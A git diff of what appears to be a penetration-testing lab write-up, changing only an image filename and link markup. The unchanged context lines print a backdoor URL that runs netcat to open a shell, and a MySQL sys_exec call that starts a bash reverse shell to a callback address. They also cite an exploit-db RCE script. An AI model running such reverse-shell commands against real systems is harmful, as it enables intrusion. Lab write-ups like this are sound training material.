@@ -175,7 +175,7 @@ http://192.168.78.56:8295/backdoor.php?cmd=nc -e /bin/sh 192.168.49.78 8295
 
 ## Foothold Proof
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Upon going back a directory, we find config.php
 
@@ -259,7 +259,7 @@ select sys\_exec('bash -c "bash -i >& /dev/tcp/192.168.49.78/8080 0>&1"');
 
 * <mark style="color:yellow;">Apache 2.4.25</mark>
   * <mark style="color:yellow;">50512.py -- RCE</mark>
-  * <mark style="color:yellow;"></mark>[<mark style="color:yellow;">https://www.exploit-db.com/exploits/50512</mark>](https://www.exploit-db.com/exploits/50512)<mark style="color:yellow;"></mark>
+  * [<mark style="color:yellow;">https://www.exploit-db.com/exploits/50512</mark>](https://www.exploit-db.com/exploits/50512)
     * <mark style="color:yellow;">This did not work.</mark>
 * <mark style="color:yellow;">VSFTPD 3.0.3</mark>
 * <mark style="color:yellow;">PostGreSQL 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17</mark>
